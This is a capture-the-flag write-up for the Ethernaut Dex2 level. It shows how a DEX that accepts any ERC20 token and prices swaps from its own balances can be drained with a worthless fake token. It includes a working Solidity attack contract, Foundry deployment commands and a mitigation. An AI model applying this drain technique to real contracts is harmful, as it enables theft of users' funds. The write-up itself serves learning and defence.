# Intended functioning of Dex2

Dex2 is another decentralised exchange smart contract that lets users hold and swap two ERC20 tokens, `token1` and `token2`. In this Ethernaut level, the `player` is given 10 of each token while the DEX instance holds 100 of each token. The goal is to extract all the tokens from the DEX liquidity pool.

# Vulnerability

The contract uses the `getSwapAmount` function to calculate the exchange rate:

```solidity
function getSwapAmount(
    address from,
    address to,
    uint256 amount
) public view returns (uint256) {
    return (
        (amount * IERC20(to).balanceOf(address(this)))
        / IERC20(from).balanceOf(address(this))
    );
}
```

The `swap` function is:

```solidity
function swap(address from, address to, uint256 amount) public {
    require(
        IERC20(from).balanceOf(msg.sender) >= amount,
        "Not enough to swap"
    );

    // require(
    //     (from == token1 && to == token2) ||
    //     (from == token2 && to == token1),
    //     "Invalid tokens"
    // );

    uint256 swapAmount = getSwapAmount(from, to, amount);

    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
}
```

The main vulnerability is that the check restricting swaps to `token1` and `token2` has been commented out:

```solidity
// require(
//     (from == token1 && to == token2) ||
//     (from == token2 && to == token1),
//     "Invalid tokens"
// );
```

Therefore, the DEX allows users to swap **any ERC20 token** against its legitimate tokens.

This becomes exploitable because the exchange rate is calculated entirely from the DEX's current token balances:

```text
swapAmount = amount × balance(to) / balance(from)
```

We can therefore create our own fake ERC20 token and manipulate the DEX's reserves.

Initially, the DEX has:

```text
token1 = 100
token2 = 100
fake   = 0
```

We create a fake token and send 1 fake token to the DEX:

```solidity
fake.transfer(address(target), 1);
```

The DEX now has:

```text
token1 = 100
token2 = 100
fake   = 1
```

We can then call:

```solidity
target.swap(address(fake), t1, 1);
```

The DEX calculates the amount of `token1` we receive as:

```text
1 × 100 / 1 = 100 token1
```

Therefore, by giving the DEX only 1 worthless fake token, we can drain all 100 `token1` tokens from it.

The DEX's reserves are now approximately:

```text
token1 = 0
token2 = 100
fake   = 2
```

We can then perform another swap using the fake token to drain the remaining `token2`. The exact amount of fake tokens needed is determined by the same balance-based pricing formula.

The following `attack` function performs the exploit:

```solidity
function attack(address player) public {
    // Create a fake ERC20 token with the attack contract as its owner.
    SwappableTokenTwo fake = new SwappableTokenTwo(
        address(target),
        "fake",
        "FK",
        4
    );

    // Allow the DEX to spend the attack contract's fake tokens.
    fake.approve(
        address(this),
        address(target),
        type(uint256).max
    );

    address t1 = target.token1();
    address t2 = target.token2();

    // Give the DEX 1 fake token to manipulate its exchange rate.
    fake.transfer(address(target), 1);

    // Drain all 100 token1 from the DEX.
    target.swap(address(fake), t1, 1);

    // Manipulate the rate again and drain token2.
    target.swap(address(fake), t2, 2);

    // Transfer the drained tokens to the player.
    SwappableTokenTwo(t1).transfer(player, 100);
    SwappableTokenTwo(t2).transfer(player, 100);
}
```

The `SwappableTokenTwo` contract has a modified `approve` function:

```solidity
function approve(
    address owner,
    address spender,
    uint256 amount
) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
}
```

This prevents the DEX itself from being specified as the owner when creating approvals. In our exploit, however, the `owner` is the attack contract:

```solidity
fake.approve(
    address(this),
    address(target),
    type(uint256).max
);
```

Since the attack contract is not the DEX, the `InvalidApprover` check does not trigger.

# Exploit using Foundry

To carry out the exploit, we first deploy the attack contract to the Sepolia network using our Sepolia RPC:

```bash
forge create ./src/attack.sol:attackContract \
    --rpc-url $SEPOLIA_RPC_URL \
    --private-key $PRIVATE_KEY \
    --broadcast \
    --constructor-args $INSTANCE_ADDRESS
```

This gives us the deployed address of our attack contract.

We can then call the `attack` function using `cast send`:

```bash
cast send $ATTACKCONTRACT_DEPLOYED_ADDRESS \
    "attack(address)" \
    $PLAYER_ADDRESS \
    --rpc-url $SEPOLIA_RPC_URL \
    --private-key $PRIVATE_KEY
```

Unlike `cast call`, `cast send` actually broadcasts the transaction and changes the state of the contracts.

After the transaction succeeds, the DEX has been drained of its `token1` and `token2`, completing the level.

# MITIGATION

The primary vulnerability is that the `swap` function does not verify that the `from` and `to` tokens are the two legitimate tokens supported by the DEX.

The commented-out check should therefore be restored:

```solidity
require(
    (from == token1 && to == token2) ||
    (from == token2 && to == token1),
    "Invalid tokens"
);
```

This ensures that users can only swap `token1` and `token2` and prevents an attacker from introducing an arbitrary ERC20 token to manipulate the exchange rate.

However, simply restricting the accepted tokens does not make the pricing mechanism suitable for a production DEX. The exchange rate is still calculated directly from the current token balances:

```solidity
(amount * balanceOf(to)) / balanceOf(from)
```

A production DEX should use a properly designed AMM pricing mechanism, such as a constant-product invariant, along with appropriate slippage protection and other safeguards.

For this Ethernaut level, however, restoring the token validation check is the key mitigation because it prevents the attacker from supplying a fake token and manipulating the DEX's reserves.
